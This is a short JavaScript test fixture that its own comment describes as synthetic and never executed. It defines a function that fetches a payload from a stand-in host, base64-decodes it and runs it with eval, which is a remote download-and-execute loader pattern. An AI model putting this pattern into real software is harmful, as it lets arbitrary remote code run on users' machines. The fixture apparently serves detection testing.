// Synthetic loader-shaped fixture. It is parsed as text and must never execute.
export async function l(){const r=await fetch("https://loader-delta.invalid/payload.txt"),p=await r.text();return eval(atob(p))}
